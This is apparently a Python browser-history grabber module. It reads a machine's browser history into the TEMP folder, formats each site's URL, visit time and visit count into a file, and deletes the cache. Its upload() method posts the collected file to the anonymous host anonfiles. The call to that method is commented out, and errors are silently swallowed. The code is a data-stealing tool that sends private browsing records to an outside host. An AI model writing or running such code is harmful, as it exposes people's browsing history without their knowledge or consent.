import os
import requests
from browser_history import get_history



class GrabBrowserHistory:
    """
    :py:class:`Grab browser history` and write its data into a file

    Data Grabbed:
        url         :   the url of the website
        title       :   the title of the website
        visit time  :   the time and date the website was visited
        visits      :   the amount of times the website has been visited
        length      :   the length of the url
        record id   :   the id of the record

    """

    def __init__(self):
        self.temp      = os.getenv("TEMP")
        self.filepath  = self.temp + '\\history_cache.txt'
        self.filepath2 = self.temp + '\\clean_history.txt'

        self.websites  = []
        self.cleandata = []
        self.checked   = []

        self.total     = 0

    def grab(self):
        ''' Grab the browser history and write data to a file '''

        # Get the history
        outputs = get_history()
        history = outputs.histories

        # Write the history to a file
        with open(self.filepath, 'w') as f:
            for i in history:
                f.write(str(i[0]) + ' ' + i[1] + '\n')

    def read(self):
        ''' Read browser history from a file '''

        with open(self.filepath, 'r') as f:
            for line in f:
                self.websites.append(line.strip())

    def write_data(self, website: str):
        '''
        Write website infomation to a file

        Arguments:
            website: str
        '''
        _website = website[26:]
        
        # If website data has not already been writen
        if _website not in self.checked:
            self.total+=1
            file = open(self.filepath2, 'a')

            # Get the amount of times the website has been visited
            amount = 0
            for i in self.websites:
                if i[26:] == _website:
                    amount+=1
                    self.checked.append(i[26:])

            # Write the data to a file
            try: 
                data = f"""
============================================================
URL       \t: {_website}
Visit Time\t: {website[:10]} {website[10:19]}
Visits    \t: {amount}
URL Length\t: {len(_website)}
Record ID \t: {self.total}
============================================================
"""
                
                file.write(data)
            except: pass
    
    def upload(self):
        ''' Upload the clean data to anonfiles '''
        try:
            files    = {'file': (self.filepath2, open(self.filepath2, 'rb'))}
            response = requests.post('https://api.anonfiles.com/upload', files=files)
            data     = response.json()

            print("File uploaded to: " + str(data['data']['file']['url']['short']))
        except: pass

    def start(self):
        # If clean data file exists, delete it and create a new file
        if os.path.exists(self.filepath2):
            os.remove(self.filepath2)

        self.grab()
        self.read()

        for i in self.websites:
            self.write_data(i)

        # Delete the history cache file
        os.remove(self.filepath)

        # If you want to upload the clean data to anonfiles, uncomment the line below
        # self.upload()




if __name__ == '__main__':
    GrabBrowserHistory().start()
